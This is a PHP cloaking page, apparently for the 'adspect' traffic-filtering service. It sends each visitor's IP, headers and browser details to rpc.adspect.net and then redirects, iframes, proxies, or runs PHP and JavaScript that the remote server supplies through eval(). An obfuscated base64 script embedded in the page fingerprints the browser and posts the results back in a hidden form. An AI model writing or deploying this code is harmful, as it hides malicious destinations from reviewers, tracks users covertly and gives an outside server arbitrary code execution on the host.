<?php
 ini_set('display_errors', '0'); error_reporting(E_ALL); if (!function_exists('adspect')) { function adspect_exit($code, $message) { http_response_code($code); exit($message); } function adspect_dig($array, $key, $default = '') { return array_key_exists($key, $array) ? $array[$key] : $default; } function adspect_resolve_path($path) { if ($path[0] === DIRECTORY_SEPARATOR) { $path = adspect_dig($_SERVER, 'DOCUMENT_ROOT', __DIR__) . $path; } else { $path = __DIR__ . DIRECTORY_SEPARATOR . $path; } return realpath($path); } function adspect_spoof_request($url) { $_SERVER['REQUEST_METHOD'] = 'GET'; $_POST = []; $query = parse_url($url, PHP_URL_QUERY); if (is_string($query)) { parse_str($query, $_GET); $_SERVER['QUERY_STRING'] = $query; } } function adspect_try_files() { foreach (func_get_args() as $path) { if (is_file($path)) { if (!is_readable($path)) { adspect_exit(403, 'Permission denied'); } switch (strtolower(pathinfo($path, PATHINFO_EXTENSION))) { case 'php': case 'html': case 'htm': case 'phtml': case 'php5': case 'php4': case 'php3': adspect_execute($path); exit; default: header('Content-Type: ' . adspect_content_type($path)); header('Content-Length: ' . filesize($path)); readfile($path); exit; } } } adspect_exit(404, 'File not found'); } function adspect_execute() { global $_adspect; require_once func_get_arg(0); } function adspect_content_type($path) { if (function_exists('mime_content_type')) { $type = mime_content_type($path); if (is_string($type)) { return $type; } } return 'application/octet-stream'; } function adspect_serve_local($url) { $path = (string)parse_url($url, PHP_URL_PATH); if ($path === '') { return null; } $path = adspect_resolve_path($path); if (is_string($path)) { adspect_spoof_request($url); if (is_dir($path)) { chdir($path); adspect_try_files('index.php', 'index.html', 'index.htm'); return; } chdir(dirname($path)); adspect_try_files($path); return; } adspect_exit(404, 'File not found'); } function adspect_tokenize($str, $sep) { $toks = []; $tok = strtok($str, $sep); while ($tok !== false) { $toks[] = $tok; $tok = strtok($sep); } return $toks; } function adspect_x_forwarded_for() { if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) { $xff = adspect_tokenize($_SERVER['HTTP_X_FORWARDED_FOR'], ', '); } elseif (array_key_exists('HTTP_CF_CONNECTING_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_CF_CONNECTING_IP']]; } elseif (array_key_exists('HTTP_X_REAL_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_X_REAL_IP']]; } else { $xff = []; } if (array_key_exists('REMOTE_ADDR', $_SERVER)) { $xff[] = $_SERVER['REMOTE_ADDR']; } return array_unique($xff); } function adspect_headers() { $headers = []; foreach ($_SERVER as $key => $value) { if (!strncmp('HTTP_', $key, 5)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[$header] = $value; } } return $headers; } function adspect_crypt($in, $key) { $il = strlen($in); $kl = strlen($key); $out = ''; for ($i = 0; $i < $il; ++$i) { $out .= chr(ord($in[$i]) ^ ord($key[$i % $kl])); } return $out; } function adspect_proxy_headers() { $headers = []; foreach (func_get_args() as $key) { if (array_key_exists($key, $_SERVER)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[] = "{$header}: {$_SERVER[$key]}"; } } return $headers; } function adspect_proxy($url, $xff, $param = null, $key = null) { $url = parse_url($url); if (empty($url)) { adspect_exit(500, 'Invalid proxy URL'); } extract($url); $curl = curl_init(); curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_USERAGENT, adspect_dig($_SERVER, 'HTTP_USER_AGENT', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36')); curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); if (!isset($scheme)) { $scheme = 'http'; } if (!isset($host)) { $host = adspect_dig($_SERVER, 'HTTP_HOST', 'localhost'); } if (isset($user, $pass)) { curl_setopt($curl, CURLOPT_USERPWD, "$user:$pass"); $host = "$user:$pass@$host"; } if (isset($port)) { curl_setopt($curl, CURLOPT_PORT, $port); $host = "$host:$port"; } $origin = "$scheme://$host"; if (!isset($path)) { $path = '/'; } if ($path[0] !== '/') { $path = "/$path"; } $url = $path; if (isset($query)) { $url .= "?$query"; } curl_setopt($curl, CURLOPT_URL, $origin . $url); $headers = adspect_proxy_headers('HTTP_ACCEPT', 'HTTP_ACCEPT_ENCODING', 'HTTP_ACCEPT_LANGUAGE', 'HTTP_COOKIE'); if ($xff !== '') { $headers[] = "X-Forwarded-For: {$xff}"; } if (!empty($headers)) { curl_setopt($curl, CURLOPT_HTTPHEADER, $headers); } $data = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); $type = curl_getinfo($curl, CURLINFO_CONTENT_TYPE); curl_close($curl); http_response_code($code); if (is_string($data)) { if (isset($param, $key) && preg_match('{^text/(?:html|css)}i', $type)) { $base = $path; if ($base[-1] !== '/') { $base = dirname($base); } $base = rtrim($base, '/'); $rw = function ($m) use ($origin, $base, $param, $key) { list($repl, $what, $url) = $m; $url = parse_url($url); if (!empty($url)) { extract($url); if (isset($host)) { if (!isset($scheme)) { $scheme = 'http'; } $host = "$scheme://$host"; if (isset($user, $pass)) { $host = "$user:$pass@$host"; } if (isset($port)) { $host = "$host:$port"; } } else { $host = $origin; } if (!isset($path)) { $path = ''; } if (!strlen($path) || $path[0] !== '/') { $path = "$base/$path"; } if (!isset($query)) { $query = ''; } $host = base64_encode(adspect_crypt($host, $key)); parse_str($query, $query); $query[$param] = "$path#$host"; $repl = '?' . http_build_query($query); if (isset($fragment)) { $repl .= "#$fragment"; } if ($what[-1] === '=') { $repl = "\"$repl\""; } $repl = $what . $repl; } return $repl; }; $re = '{(href=|src=|url\()["\']?((?:https?:|(?!#|[[:alnum:]]+:))[^"\'[:space:]>)]+)["\']?}i'; $data = preg_replace_callback($re, $rw, $data); } } else { $data = ''; } header("Content-Type: $type"); header('Content-Length: ' . strlen($data)); echo $data; } function adspect($sid, $mode, $param, $key) { if (!function_exists('curl_init')) { adspect_exit(500, 'curl extension is missing'); } $xff = adspect_x_forwarded_for(); $addr = adspect_dig($xff, 0); $xff = implode(', ', $xff); if (array_key_exists($param, $_GET) && strpos($_GET[$param], '#') !== false) { list($url, $host) = explode('#', $_GET[$param], 2); $host = adspect_crypt(base64_decode($host), $key); unset($_GET[$param]); $query = http_build_query($_GET); $url = "$host$url?$query"; adspect_proxy($url, $xff, $param, $key); exit; } $ajax = intval($mode === 'ajax'); $curl = curl_init(); $sid = adspect_dig($_GET, '__sid', $sid); $ua = adspect_dig($_SERVER, 'HTTP_USER_AGENT'); $referrer = adspect_dig($_SERVER, 'HTTP_REFERER'); $query = http_build_query($_GET); if ($_SERVER['REQUEST_METHOD'] == 'POST') { $payload = json_decode($_POST['data'], true); $payload['headers'] = adspect_headers(); curl_setopt($curl, CURLOPT_POST, true); curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($payload)); } if ($ajax) { header('Access-Control-Allow-Origin: *'); $cid = adspect_dig($_SERVER, 'HTTP_X_REQUEST_ID'); } else { $cid = adspect_dig($_COOKIE, '_cid'); } curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_HTTPHEADER, [ 'Accept: application/json', "X-Forwarded-For: {$xff}", "X-Forwarded-Host: {$_SERVER['HTTP_HOST']}", "X-Request-ID: {$cid}", "Adspect-IP: {$addr}", "Adspect-UA: {$ua}", "Adspect-JS: {$ajax}", "Adspect-Referrer: {$referrer}", ]); curl_setopt($curl, CURLOPT_URL, "https://rpc.adspect.net/v2/{$sid}?{$query}"); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $json = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); curl_close($curl); header('Cache-Control: no-store'); switch ($code) { case 200: case 202: $data = json_decode($json, true); if (!is_array($data)) { adspect_exit(500, 'Invalid backend response'); } global $_adspect; $_adspect = $data; extract($data); if ($ajax) { switch ($action) { case 'php': ob_start(); eval($target); $data['target'] = ob_get_clean(); $json = json_encode($data); break; } if ($_SERVER['REQUEST_METHOD'] === 'POST') { header('Content-Type: application/json'); echo $json; } else { header('Content-Type: application/javascript'); echo "window._adata={$json};"; return $target; } } else { if ($js) { setcookie('_cid', $cid, time() + 60); return $target; } switch ($action) { case 'local': return adspect_serve_local($target); case 'noop': adspect_spoof_request($target); return null; case '301': case '302': case '303': header("Location: {$target}", true, (int)$action); break; case 'xar': header("X-Accel-Redirect: {$target}"); break; case 'xsf': header("X-Sendfile: {$target}"); break; case 'refresh': header("Refresh: 0; url={$target}"); break; case 'meta': $target = htmlspecialchars($target); echo "<!DOCTYPE html><head><meta http-equiv=\"refresh\" content=\"0; url={$target}\"></head>"; break; case 'iframe': $target = htmlspecialchars($target); echo "<!DOCTYPE html><iframe src=\"{$target}\" style=\"width:100%;height:100%;position:absolute;top:0;left:0;z-index:999999;border:none;\"></iframe>"; break; case 'proxy': adspect_proxy($target, $xff, $param, $key); break; case 'fetch': adspect_proxy($target, $xff); break; case 'return': if (is_numeric($target)) { http_response_code((int)$target); } else { adspect_exit(500, 'Non-numeric status code'); } break; case 'php': eval($target); break; case 'js': $target = htmlspecialchars(base64_encode($target)); echo "<!DOCTYPE html><body><script src=\"data:text/javascript;base64,{$target}\"></script></body>"; break; } } exit; case 404: adspect_exit(404, 'Stream not found'); default: adspect_exit($code, 'Backend response code ' . $code); } } } $target = adspect('6170be06-f3ac-42a0-93ac-864d46d90fd3', 'redirect', '_', base64_decode('CfBgAG74FomPNpu6Kn7Xe0ttObviQ69jh1Jheei+gTQ=')); if (!isset($target)) { return; } ?>
<!DOCTYPE html>
<html>
<head>
	<meta http-equiv="refresh" content="10; url=<?= htmlspecialchars($target) ?>">
	<meta name="referrer" content="no-referrer">
</head>
<body>
	<script src="data:text/javascript;base64,dmFyIF8weDQxM2Y9WyduYXZpZ2F0b3InLCdhcHBlbmRDaGlsZCcsJ25vZGVWYWx1ZScsJ2RhdGEnLCdwdXNoJywnY29uc29sZScsJzg3MTQ3M21lcnlDdCcsJ3RpbWV6b25lT2Zmc2V0JywnMjI3T2VQYmdGJywndGhlbicsJ2dldEV4dGVuc2lvbicsJ2dldFBhcmFtZXRlcicsJ1VOTUFTS0VEX1ZFTkRPUl9XRUJHTCcsJ2NyZWF0ZUVsZW1lbnQnLCdkb2N1bWVudCcsJ2NyZWF0ZUV2ZW50JywnMTcxMDQzZVFlZGlqJywnUE9TVCcsJ2dldE93blByb3BlcnR5TmFtZXMnLCcxNTU2MDc3WHlMb3lDJywndmFsdWUnLCdwZXJtaXNzaW9ucycsJ2Vycm9ycycsJ21ldGhvZCcsJ25hbWUnLCdmb3JtJywnYm9keScsJ3Blcm1pc3Npb24nLCdUb3VjaEV2ZW50Jywnc3RyaW5naWZ5JywnZG9jdW1lbnRFbGVtZW50JywnNjQ3VXBGV2xWJywnd2ViZ2wnLCcxNTc2Nzk0bU5lSGJ2JywnYXR0cmlidXRlcycsJzU0NDFqcE1mTnEnLCdjbG9zdXJlJywnbGVuZ3RoJywndG9TdHJpbmcnLCdvYmplY3QnLCc5MzU3Q2x0RWpLJywnc2NyZWVuJywnbG9jYXRpb24nLCdtZXNzYWdlJywnbG9nJywnMjQzNVZVS21BYycsJ2lucHV0Jywnbm90aWZpY2F0aW9ucycsJ1VOTUFTS0VEX1JFTkRFUkVSX1dFQkdMJywnMjExTXF6aHNrJywnTm90aWZpY2F0aW9uJywnV0VCR0xfZGVidWdfcmVuZGVyZXJfaW5mbycsJ3R5cGUnXTt2YXIgXzB4NWU4Mz1mdW5jdGlvbihfMHgxZDExN2UsXzB4YWY3NTIzKXtfMHgxZDExN2U9XzB4MWQxMTdlLTB4MWMxO3ZhciBfMHg0MTNmMTE9XzB4NDEzZltfMHgxZDExN2VdO3JldHVybiBfMHg0MTNmMTE7fTsoZnVuY3Rpb24oXzB4NDFlYmUxLF8weDJjMGFjMSl7dmFyIF8weDQzMTNiYj1fMHg1ZTgzO3doaWxlKCEhW10pe3RyeXt2YXIgXzB4NGMxNzhlPXBhcnNlSW50KF8weDQzMTNiYigweDFjOSkpKy1wYXJzZUludChfMHg0MzEzYmIoMHgxYzcpKSpwYXJzZUludChfMHg0MzEzYmIoMHgxZDUpKSstcGFyc2VJbnQoXzB4NDMxM2JiKDB4MWUzKSkrcGFyc2VJbnQoXzB4NDMxM2JiKDB4MWVkKSkrLXBhcnNlSW50KF8weDQzMTNiYigweDFmMCkpK3BhcnNlSW50KF8weDQzMTNiYigweDFjYikpKnBhcnNlSW50KF8weDQzMTNiYigweDFlNSkpKy1wYXJzZUludChfMHg0MzEzYmIoMHgxZDkpKSotcGFyc2VJbnQoXzB4NDMxM2JiKDB4MWQwKSk7aWYoXzB4NGMxNzhlPT09XzB4MmMwYWMxKWJyZWFrO2Vsc2UgXzB4NDFlYmUxWydwdXNoJ10oXzB4NDFlYmUxWydzaGlmdCddKCkpO31jYXRjaChfMHgxMzkyODIpe18weDQxZWJlMVsncHVzaCddKF8weDQxZWJlMVsnc2hpZnQnXSgpKTt9fX0oXzB4NDEzZiwweGU4ZmE0KSxmdW5jdGlvbigpe3ZhciBfMHgzY2UxNzc9XzB4NWU4MztmdW5jdGlvbiBfMHgxYzJjNDQoKXt2YXIgXzB4MWQ2ZTA1PV8weDVlODM7XzB4NDExNGJhW18weDFkNmUwNSgweDFmMyldPV8weDUxN2NjMTt2YXIgXzB4ODkzNmIzPWRvY3VtZW50W18weDFkNmUwNSgweDFlYSldKF8weDFkNmUwNSgweDFjMSkpLF8weDU4NzE5ZT1kb2N1bWVudFtfMHgxZDZlMDUoMHgxZWEpXShfMHgxZDZlMDUoMHgxZDYpKTtfMHg4OTM2YjNbXzB4MWQ2ZTA1KDB4MWY0KV09XzB4MWQ2ZTA1KDB4MWVlKSxfMHg4OTM2YjNbJ2FjdGlvbiddPXdpbmRvd1tfMHgxZDZlMDUoMHgxZDIpXVsnaHJlZiddLF8weDU4NzE5ZVtfMHgxZDZlMDUoMHgxZGMpXT0naGlkZGVuJyxfMHg1ODcxOWVbXzB4MWQ2ZTA1KDB4MWY1KV09XzB4MWQ2ZTA1KDB4MWUwKSxfMHg1ODcxOWVbXzB4MWQ2ZTA1KDB4MWYxKV09SlNPTltfMHgxZDZlMDUoMHgxYzUpXShfMHg0MTE0YmEpLF8weDg5MzZiM1tfMHgxZDZlMDUoMHgxZGUpXShfMHg1ODcxOWUpLGRvY3VtZW50W18weDFkNmUwNSgweDFjMildW18weDFkNmUwNSgweDFkZSldKF8weDg5MzZiMyksXzB4ODkzNmIzWydzdWJtaXQnXSgpO312YXIgXzB4NTE3Y2MxPVtdLF8weDQxMTRiYT17fTt0cnl7dmFyIF8weDU1ZmYzMz1mdW5jdGlvbihfMHgzNGNjODkpe3ZhciBfMHgxODI4ODg9XzB4NWU4MztpZignb2JqZWN0Jz09PXR5cGVvZiBfMHgzNGNjODkmJm51bGwhPT1fMHgzNGNjODkpe3ZhciBfMHg0YjNmYTU9ZnVuY3Rpb24oXzB4MTVhMDBjKXt2YXIgXzB4MTE5ZDFkPV8weDVlODM7dHJ5e3ZhciBfMHg3ZTg2ODA9XzB4MzRjYzg5W18weDE1YTAwY107c3dpdGNoKHR5cGVvZiBfMHg3ZTg2ODApe2Nhc2UgXzB4MTE5ZDFkKDB4MWNmKTppZihudWxsPT09XzB4N2U4NjgwKWJyZWFrO2Nhc2UnZnVuY3Rpb24nOl8weDdlODY4MD1fMHg3ZTg2ODBbXzB4MTE5ZDFkKDB4MWNlKV0oKTt9XzB4NGFkYWNlW18weDE1YTAwY109XzB4N2U4NjgwO31jYXRjaChfMHgzMDUyYmEpe18weDUxN2NjMVtfMHgxMTlkMWQoMHgxZTEpXShfMHgzMDUyYmFbXzB4MTE5ZDFkKDB4MWQzKV0pO319LF8weDRhZGFjZT17fSxfMHgxMGFmY2Q7Zm9yKF8weDEwYWZjZCBpbiBfMHgzNGNjODkpXzB4NGIzZmE1KF8weDEwYWZjZCk7dHJ5e3ZhciBfMHg0OWFhZTQ9T2JqZWN0W18weDE4Mjg4OCgweDFlZildKF8weDM0Y2M4OSk7Zm9yKF8weDEwYWZjZD0weDA7XzB4MTBhZmNkPF8weDQ5YWFlNFtfMHgxODI4ODgoMHgxY2QpXTsrK18weDEwYWZjZClfMHg0YjNmYTUoXzB4NDlhYWU0W18weDEwYWZjZF0pO18weDRhZGFjZVsnISEnXT1fMHg0OWFhZTQ7fWNhdGNoKF8weDRkMWJhNyl7XzB4NTE3Y2MxW18weDE4Mjg4OCgweDFlMSldKF8weDRkMWJhN1snbWVzc2FnZSddKTt9cmV0dXJuIF8weDRhZGFjZTt9fTtfMHg0MTE0YmFbXzB4M2NlMTc3KDB4MWQxKV09XzB4NTVmZjMzKHdpbmRvd1snc2NyZWVuJ10pLF8weDQxMTRiYVsnd2luZG93J109XzB4NTVmZjMzKHdpbmRvdyksXzB4NDExNGJhW18weDNjZTE3NygweDFkZCldPV8weDU1ZmYzMyh3aW5kb3dbXzB4M2NlMTc3KDB4MWRkKV0pLF8weDQxMTRiYVtfMHgzY2UxNzcoMHgxZDIpXT1fMHg1NWZmMzMod2luZG93W18weDNjZTE3NygweDFkMildKSxfMHg0MTE0YmFbXzB4M2NlMTc3KDB4MWUyKV09XzB4NTVmZjMzKHdpbmRvd1tfMHgzY2UxNzcoMHgxZTIpXSksXzB4NDExNGJhW18weDNjZTE3NygweDFjNildPWZ1bmN0aW9uKF8weDUyYjE2Yil7dmFyIF8weDRiODViZj1fMHgzY2UxNzc7dHJ5e3ZhciBfMHgzYzU4NzM9e307XzB4NTJiMTZiPV8weDUyYjE2YltfMHg0Yjg1YmYoMHgxY2EpXTtmb3IodmFyIF8weDI1ZGFmYiBpbiBfMHg1MmIxNmIpXzB4MjVkYWZiPV8weDUyYjE2YltfMHgyNWRhZmJdLF8weDNjNTg3M1tfMHgyNWRhZmJbJ25vZGVOYW1lJ11dPV8weDI1ZGFmYltfMHg0Yjg1YmYoMHgxZGYpXTtyZXR1cm4gXzB4M2M1ODczO31jYXRjaChfMHgxZmYzY2Ipe18weDUxN2NjMVtfMHg0Yjg1YmYoMHgxZTEpXShfMHgxZmYzY2JbJ21lc3NhZ2UnXSk7fX0oZG9jdW1lbnRbXzB4M2NlMTc3KDB4MWM2KV0pLF8weDQxMTRiYVtfMHgzY2UxNzcoMHgxZWIpXT1fMHg1NWZmMzMoZG9jdW1lbnQpO3RyeXtfMHg0MTE0YmFbXzB4M2NlMTc3KDB4MWU0KV09bmV3IERhdGUoKVsnZ2V0VGltZXpvbmVPZmZzZXQnXSgpO31jYXRjaChfMHgzYTJhZTUpe18weDUxN2NjMVtfMHgzY2UxNzcoMHgxZTEpXShfMHgzYTJhZTVbXzB4M2NlMTc3KDB4MWQzKV0pO310cnl7XzB4NDExNGJhW18weDNjZTE3NygweDFjYyldPWZ1bmN0aW9uKCl7fVsndG9TdHJpbmcnXSgpO31jYXRjaChfMHhjZGViYjIpe18weDUxN2NjMVtfMHgzY2UxNzcoMHgxZTEpXShfMHhjZGViYjJbXzB4M2NlMTc3KDB4MWQzKV0pO310cnl7XzB4NDExNGJhWyd0b3VjaEV2ZW50J109ZG9jdW1lbnRbXzB4M2NlMTc3KDB4MWVjKV0oXzB4M2NlMTc3KDB4MWM0KSlbXzB4M2NlMTc3KDB4MWNlKV0oKTt9Y2F0Y2goXzB4NTRjMTVlKXtfMHg1MTdjYzFbXzB4M2NlMTc3KDB4MWUxKV0oXzB4NTRjMTVlW18weDNjZTE3NygweDFkMyldKTt9dHJ5e18weDU1ZmYzMz1mdW5jdGlvbigpe307dmFyIF8weDQ2NzE5NT0weDA7XzB4NTVmZjMzWyd0b1N0cmluZyddPWZ1bmN0aW9uKCl7cmV0dXJuKytfMHg0NjcxOTUsJyc7fSxjb25zb2xlW18weDNjZTE3NygweDFkNCldKF8weDU1ZmYzMyksXzB4NDExNGJhWyd0b3N0cmluZyddPV8weDQ2NzE5NTt9Y2F0Y2goXzB4OGNkMDZmKXtfMHg1MTdjYzFbXzB4M2NlMTc3KDB4MWUxKV0oXzB4OGNkMDZmW18weDNjZTE3NygweDFkMyldKTt9d2luZG93W18weDNjZTE3NygweDFkZCldW18weDNjZTE3NygweDFmMildWydxdWVyeSddKHsnbmFtZSc6XzB4M2NlMTc3KDB4MWQ3KX0pW18weDNjZTE3NygweDFlNildKGZ1bmN0aW9uKF8weDU3MDJjMCl7dmFyIF8weDE0MzE1NT1fMHgzY2UxNzc7XzB4NDExNGJhW18weDE0MzE1NSgweDFmMildPVt3aW5kb3dbXzB4MTQzMTU1KDB4MWRhKV1bXzB4MTQzMTU1KDB4MWMzKV0sXzB4NTcwMmMwWydzdGF0ZSddXSxfMHgxYzJjNDQoKTt9LF8weDFjMmM0NCk7dHJ5e3ZhciBfMHg0ZGZmYzQ9ZG9jdW1lbnRbJ2NyZWF0ZUVsZW1lbnQnXSgnY2FudmFzJylbJ2dldENvbnRleHQnXShfMHgzY2UxNzcoMHgxYzgpKSxfMHgyNmQ0YzE9XzB4NGRmZmM0W18weDNjZTE3NygweDFlNyldKF8weDNjZTE3NygweDFkYikpO18weDQxMTRiYVsnd2ViZ2wnXT17J3ZlbmRvcic6XzB4NGRmZmM0W18weDNjZTE3NygweDFlOCldKF8weDI2ZDRjMVtfMHgzY2UxNzcoMHgxZTkpXSksJ3JlbmRlcmVyJzpfMHg0ZGZmYzRbXzB4M2NlMTc3KDB4MWU4KV0oXzB4MjZkNGMxW18weDNjZTE3NygweDFkOCldKX07fWNhdGNoKF8weGQ1Y2ZmKXtfMHg1MTdjYzFbXzB4M2NlMTc3KDB4MWUxKV0oXzB4ZDVjZmZbXzB4M2NlMTc3KDB4MWQzKV0pO319Y2F0Y2goXzB4NWY0ZTg2KXtfMHg1MTdjYzFbXzB4M2NlMTc3KDB4MWUxKV0oXzB4NWY0ZTg2W18weDNjZTE3NygweDFkMyldKSxfMHgxYzJjNDQoKTt9fSgpKTs="></script>
</body>
</html>
<?php exit;